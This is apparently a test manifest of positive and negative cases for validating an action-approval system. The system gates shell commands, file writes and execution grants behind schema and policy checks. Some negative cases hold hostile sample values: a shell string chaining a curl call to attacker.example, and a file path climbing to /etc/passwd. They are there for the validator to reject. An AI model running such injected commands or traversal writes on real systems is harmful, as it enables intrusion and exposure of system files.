{
  "positive": [
    {
      "name": "shell.exec reference payload",
      "schema": "schemas/actions/shell.exec.schema.json",
      "instance": "examples/actions/shell.exec.json"
    },
    {
      "name": "file.write reference payload",
      "schema": "schemas/actions/file.write.schema.json",
      "instance": "examples/actions/file.write.json"
    },
    {
      "name": "policy outcome with its matched rules",
      "schema": "schemas/approval-policy.schema.json",
      "instance": "examples/approval-policy-rules.json"
    },
    {
      "name": "dispatch with an execution grant",
      "schema": "schemas/approval-envelope.schema.json",
      "instance": "examples/granted-envelope.json",
      "semantic": true
    },
    {
      "name": "standalone dispatch record with an execution grant",
      "schema": "schemas/dispatch-record.schema.json",
      "instance": "examples/granted-dispatch-record.json"
    }
  ],
  "negative": [
    {
      "name": "shell command given as one shell string",
      "schema": "schemas/actions/shell.exec.schema.json",
      "instance": "examples/actions/shell.exec.json",
      "expect": "schema",
      "operations": [
        {
          "op": "replace",
          "path": "/command",
          "value": "git push origin release/2026-04 && curl attacker.example"
        }
      ]
    },
    {
      "name": "shell command without its working directory",
      "schema": "schemas/actions/shell.exec.schema.json",
      "instance": "examples/actions/shell.exec.json",
      "expect": "schema",
      "operations": [
        {
          "op": "remove",
          "path": "/working_directory"
        }
      ]
    },
    {
      "name": "shell command with a relative working directory",
      "schema": "schemas/actions/shell.exec.schema.json",
      "instance": "examples/actions/shell.exec.json",
      "expect": "schema",
      "operations": [
        {
          "op": "replace",
          "path": "/working_directory",
          "value": "billing-service"
        }
      ]
    },
    {
      "name": "file write that climbs out of its directory",
      "schema": "schemas/actions/file.write.schema.json",
      "instance": "examples/actions/file.write.json",
      "expect": "schema",
      "operations": [
        {
          "op": "replace",
          "path": "/path",
          "value": "/srv/builds/billing-service/../../etc/passwd"
        }
      ]
    },
    {
      "name": "file patch that also carries replacement text",
      "schema": "schemas/actions/file.write.schema.json",
      "instance": "examples/actions/file.write.json",
      "expect": "schema",
      "operations": [
        {
          "op": "add",
          "path": "/content_text",
          "value": "exports:\n  per_minute: 50\n"
        }
      ]
    },
    {
      "name": "review omits the proposed effect hints",
      "schema": "schemas/approval-envelope.schema.json",
      "instance": "examples/approval-envelope.json",
      "expect": "semantic",
      "expect_error": "changes the effect hints",
      "operations": [
        {
          "op": "remove",
          "path": "/review_snapshots/0/content/effects"
        }
      ]
    },
    {
      "name": "auto approval of an open-world action that needs a human",
      "schema": "schemas/approval-envelope.schema.json",
      "instance": "examples/approval-envelope.json",
      "expect": "semantic",
      "expect_error": "effects open_world cannot be auto approved",
      "operations": [
        {
          "op": "replace",
          "path": "/request/policy/outcome",
          "value": "auto_approve"
        },
        {
          "op": "replace",
          "path": "/request/policy/requirements/allow_auto_approval",
          "value": true
        }
      ]
    },
    {
      "name": "effect hints that are read-only and destructive",
      "schema": "schemas/proposed-action.schema.json",
      "instance": "examples/email-reply-approval.json",
      "expect": "schema",
      "operations": [
        {
          "op": "replace",
          "path": "/effects/read_only",
          "value": true
        },
        {
          "op": "replace",
          "path": "/effects/destructive",
          "value": true
        }
      ]
    },
    {
      "name": "matched rule effect outside the closed set",
      "schema": "schemas/approval-policy.schema.json",
      "instance": "examples/approval-policy-rules.json",
      "expect": "schema",
      "operations": [
        {
          "op": "replace",
          "path": "/matched_rules/0/effect",
          "value": "allow"
        }
      ]
    },
    {
      "name": "unavailable evaluator escalated without the policy opt-in",
      "schema": "schemas/approval-envelope.schema.json",
      "instance": "examples/approval-envelope.json",
      "expect": "semantic",
      "expect_error": "unavailable evaluator must deny unless policy escalates to a human",
      "operations": [
        {
          "op": "add",
          "path": "/request/policy/evaluation_status",
          "value": "evaluator_unavailable"
        }
      ]
    },
    {
      "name": "execution grant replayed on another dispatch attempt",
      "schema": "schemas/approval-envelope.schema.json",
      "instance": "examples/granted-envelope.json",
      "expect": "semantic",
      "expect_error": "execution grant does not bind this dispatch",
      "operations": [
        {
          "op": "replace",
          "path": "/dispatches/0/idempotency_key",
          "value": "idem_email_ZD-48211_reply_02"
        }
      ]
    },
    {
      "name": "invocation without a required execution grant",
      "schema": "schemas/approval-envelope.schema.json",
      "instance": "examples/granted-envelope.json",
      "expect": "semantic",
      "expect_error": "lacks a required execution grant",
      "operations": [
        {
          "op": "remove",
          "path": "/dispatches/0/execution_grant"
        }
      ]
    },
    {
      "name": "execution grant on a refusal",
      "schema": "schemas/dispatch-record.schema.json",
      "instance": "examples/granted-dispatch-record.json",
      "expect": "schema",
      "operations": [
        {
          "op": "replace",
          "path": "/status",
          "value": "not_dispatched"
        },
        {
          "op": "add",
          "path": "/reason",
          "value": "approval_revoked"
        },
        {
          "op": "remove",
          "path": "/provider"
        }
      ]
    }
  ]
}
